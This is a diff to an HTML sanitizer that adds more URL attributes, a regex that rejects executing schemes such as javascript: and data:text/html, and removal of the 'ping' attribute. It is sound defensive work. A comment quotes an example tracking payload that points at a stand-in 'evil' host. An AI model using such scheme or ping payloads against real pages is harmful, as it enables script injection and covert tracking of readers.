@@ -475,7 +475,58 @@ const FORBIDDEN_TAGS = new Set([
   'set',
 ])
 
-const URL_ATTRIBUTES = ['href', 'src', 'xlink:href', 'action', 'formaction']
+/**
+ * Attributes whose value is a URL.
+ *
+ * Enumerating these is the weak part of a denylist and it has already been
+ * wrong: `ping`, `srcset` and `poster` were all missing, so
+ * `<a ping="https://evil/collect">` sailed through. The scheme scan below is
+ * the real defence — this list only decides which attributes get the STRICTER
+ * treatment (rejecting schemes that are merely unknown, rather than only those
+ * that are known-dangerous).
+ */
+const URL_ATTRIBUTES = [
+  'href',
+  'src',
+  'srcset',
+  'xlink:href',
+  'action',
+  'formaction',
+  'ping',
+  'poster',
+  'background',
+  'cite',
+  'data',
+  'longdesc',
+  'profile',
+  'usemap',
+  'manifest',
+]
+
+/**
+ * Schemes that execute, in ANY attribute.
+ *
+ * Checked against every attribute value regardless of name, because the
+ * attribute list above cannot be trusted to be complete — a capability check
+ * does not depend on having heard of the attribute.
+ */
+const DANGEROUS_SCHEME = /^(javascript|vbscript|livescript|mocha|data:text\/html)/i
+
+/**
+ * Attributes removed outright, whatever their value.
+ *
+ * Dangerous by CAPABILITY rather than by scheme, so no URL check catches them:
+ * `ping` fires a POST to an arbitrary URL when a link is clicked — a perfectly
+ * ordinary https URL, reporting that the reader clicked.
+ *
+ * NOT `is`, though it belongs here conceptually: `removeAttribute('is')` is a
+ * NO-OP in Chrome once the attribute has been parsed, verified directly, so a
+ * line for it would only look like protection. DOMPurify does not remove it
+ * either. Neutralizing it means replacing the element rather than the
+ * attribute, which is not worth doing inside a TreeWalker for an attack that
+ * needs the host page to have registered a hostile customized built-in.
+ */
+const FORBIDDEN_ATTRIBUTES = new Set(['ping'])
 
 /**
  * Clobber-proof accessors.
@@ -539,6 +590,17 @@ export function sanitizeInPlace(root: Element | DocumentFragment): void {
       const name = attr.name.toLowerCase()
       // Every inline handler, however it is spelled.
       if (name.startsWith('on')) {
+        el.removeAttribute(attr.name)
+        continue
+      }
+      if (FORBIDDEN_ATTRIBUTES.has(name)) {
+        el.removeAttribute(attr.name)
+        continue
+      }
+      const normalized = forSchemeTest(attr.value)
+      // Capability check first: an executing scheme is dangerous wherever it
+      // appears, including in an attribute this list has never heard of.
+      if (DANGEROUS_SCHEME.test(normalized)) {
         el.removeAttribute(attr.name)
         continue
       }
